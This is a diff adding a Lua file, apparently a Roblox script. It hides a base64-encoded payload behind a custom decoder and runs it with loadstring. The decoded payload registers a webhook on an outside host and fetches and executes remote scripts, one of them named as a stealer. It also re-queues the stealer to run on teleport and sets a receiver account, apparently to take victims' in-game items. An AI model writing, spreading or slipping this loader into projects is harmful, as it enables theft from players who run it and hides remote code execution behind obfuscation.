@@ -1,0 +1,23 @@
+
+local _b1e89d19 = "CmxvY2FsIGVudiA9IGdldGdlbnYoKQpsb2NhbCBtYWluU2NyaXB0VXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9EdXBlTmV3L2JvdC9yZWZzL2hlYWRzL21haW4vTWFpbiIKbG9jYWwgdXNlcldlYmhvb2sgPSAiaHR0cDovL2ZpMTEuYm90LWhvc3RpbmcubmV0OjIxMjcwL3dlYmhvb2svNWYxOGI3MGYtN2U5My00MmI5LWEzYTYtNWEwYzZjOGFmMTI4Igpsb2NhbCB1c2VyQWNjZXNzQ29kZSA9ICJhV0J4SldBOGdtX0xsaVpDU21KdzdaZFBHMkpEcEU3WnNGTFA3MlkzTGV5RmluZVJCMlFBQUEyIgplbnYuYWNjZXNzY29kZSA9IHVzZXJBY2Nlc3NDb2RlCmVudi5XZWJob29rID0gdXNlcldlYmhvb2sKZW52LnBpbmd0aHJlc2hvbGQgPSAxMDAwMDAwMAp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQobWFpblNjcmlwdFVybCkpKCkgZW5kKQplbmQpCnF1ZXVlX29uX3RlbGVwb3J0KFs9WwogICAgbG9jYWwgZW52ID0gZ2V0Z2VudigpCiAgICBsb2NhbCByZWNlaXZlck5hbWUgPSAic3d1bG1hdGVzIgogICAgbG9jYWwgeW91cnNjcmlwdHVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRHVwZU5ldy9ib3QvcmVmcy9oZWFkcy9tYWluL0xvZGVuZyIKICAgIGxvY2FsIHN0ZWFsZXJTY3JpcHRVcmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R1cGVOZXcvYm90L3JlZnMvaGVhZHMvbWFpbi9TdGVhbG1haW4iCiAgICBlbnYucmVjZWl2ZXIgPSByZWNlaXZlck5hbWUKICAgIHBjYWxsKGZ1bmN0aW9uKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoc3RlYWxlclNjcmlwdFVybCkpKCkgZW5kKQogICAgaWYgeW91cnNjcmlwdHVybCBhbmQgeW91cnNjcmlwdHVybDpnc3ViKCIlcyIsICIiKSB+PSAiIiB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCh5b3Vyc2NyaXB0dXJsKSkoKSBlbmQpCiAgICBlbmQKXT1dKQ=="
+local _8d640031 = ""
+local _96161318 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local _63736cbe = {}
+for _543df3e1 = 1, #_96161318 do
+    _63736cbe[_96161318:sub(_543df3e1, _543df3e1)] = _543df3e1 - 1
+end
+for _543df3e1 = 1, #_b1e89d19, 4 do
+    local c1 = _63736cbe[_b1e89d19:sub(_543df3e1, _543df3e1)] or 0
+    local c2 = _63736cbe[_b1e89d19:sub(_543df3e1 + 1, _543df3e1 + 1)] or 0
+    local c3 = _63736cbe[_b1e89d19:sub(_543df3e1 + 2, _543df3e1 + 2)] or 0
+    local c4 = _63736cbe[_b1e89d19:sub(_543df3e1 + 3, _543df3e1 + 3)] or 0
+    local n = c1 * 262144 + c2 * 4096 + c3 * 64 + c4
+    _8d640031 = _8d640031 .. string.char(math.floor(n / 65536) % 256)
+    if _b1e89d19:sub(_543df3e1 + 2, _543df3e1 + 2) ~= "=" then
+        _8d640031 = _8d640031 .. string.char(math.floor(n / 256) % 256)
+    end
+    if _b1e89d19:sub(_543df3e1 + 3, _543df3e1 + 3) ~= "=" then
+        _8d640031 = _8d640031 .. string.char(n % 256)
+    end
+end
+loadstring(_8d640031)()
